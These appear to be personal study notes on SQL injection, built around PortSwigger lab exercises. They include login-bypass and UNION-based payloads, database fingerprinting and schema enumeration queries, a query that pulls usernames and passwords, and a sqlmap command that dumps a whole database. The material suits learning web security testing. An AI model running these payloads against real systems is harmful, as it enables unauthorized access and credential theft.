
| Attack Tactics                                                                                   | Description                                                                                                                                                                                                                                                 |
| ------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Search for endpoints that are serving data which could be linked to a SQL DB ie:(/api/jobs/1)    | ie:(login pages, comments, job boards..) Test different characters on the request and see if the application gives an error (**" , ' ; & #**)Confirming error save the request as **req.txt** and send it to **sqlmap -r req.txt --batch --dump --level 3** |
| SQL Where Clause Attack login forms, these can sometimes be bypassed with simple boolean queries | **' OR 1=1-- -** Is a very common query that can bypass login by asking to return a true statement and commenting out the rest of the query with **-- -**                                                                                                   |
| Look for anything on the page that could be passing a paremeter with **?** or **&**              | example[.]com/filter?category=Pets - On this case we could attempt to modify the query with **filter?category=Pets' OR 1=1 -- -** and verify if any contents on the page have changed or the response is different.                                         |
| [[SQL Union Attack]]                                                                             | Use **ORDER BY 1--**  or **UNION SELECT NULL,NULL--** increasing number by 1 until error or vice versa                                                                                                                                                      |
| Oracle DB Union Attack                                                                           | This Oracle built in DB  can be used to test Union Attack        **' UNION SELECT NULL FROM DUAL--**                                                                                                                                                        |
| Retrieving multiple valus single column                                                          | Concatnate strings, Oracle ie:**' UNION SELECT username \|\| '~' \|\| password FROM users--**. For more check [SQL Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)                                                             |
| Fetch DB Version of SQL                                                                          | After identifying N of columns, check DB version<br>Microsoft, MySQL = **SELECT @@version**<br>Oracle = **SELECT * FROM v$version**<br>PostgreSQL = **SELECT version()**                                                                                    |
| Listing the contents of the database                                                             | All except Oracle have **SELECT * FROM information_schema.tables** to reveal Table names. `table_name`                                                                                                                                                      |
| List columns of a Table                                                                          | Next run below to show data from table **SELECT * FROM information_schema.columns WHERE table_name = 'Users'**                                                                                                                                              |
| SQLi with Conditional access Substring                                                           |                                                                                                                                                                                                                                                             |

>[!TIPS]
>Avoid using double quotes when parsing strings, always try single quotes first.

## Generic SQL Attack Schema

| Attack Step                                        | Query                                                                                                |
| -------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| 1. List all DB tables                              | `' UNION SELECT Table_Name, NULL FROM information_schema.tables--`                                   |
| 2. List columns from chosen DB table               | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_phmnoo'--` |
| 3. List specific column(s) from chosen Table on DB | `' UNION SELECT username_cslnvp,password_dcnlub FROM users_phmnoo--`                                 |
### Example Step 1
![[Pasted image 20260202233939.png]]
This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
You can then query `information_schema.columns` to list the columns in individual tables:
### Example Step 2
![[Pasted image 20260202234009.png]]



## Resources 

### SQL Cheat Sheet
[SQL Cheat Sheet by PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
### SQL Labs
- [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data#)
### Methods
- SQLMap
- Burp Suite SQL-Extension
### Where to try SQL Injections
- Where we noticed SQL DB is running on the background
- When the application is querying information that looks like its coming from a database (ie: user, productId, country,stored data)
- Headers/Cookies can also be vuln to SQLi ie:(`Cookie: TrackingId=u5YD3Pa`)

### SQL Injection
```sql
' OR 1=1 --
```
Note: Be careful with this payload because if the DB has thousands of roles, this could crash the server.
- Every time we manage to crash the server  using a character for the language of interest, we probably have a ==SQL injection==
![[Pasted image 20251128125451.png]]

# SQL Injection - Blind SQLi
Blind SQL injection occurs when an application is vulnerable to SQL injection but does not return query results or database errors in its HTTP responses,making traditional techniques like UNION attacks ineffective since they rely on visible output; however, it can still be exploited using alternative methods such as inferential **Boolean-based queries, time delays, or out-of-band channels** to extract unauthorized data indirectly.
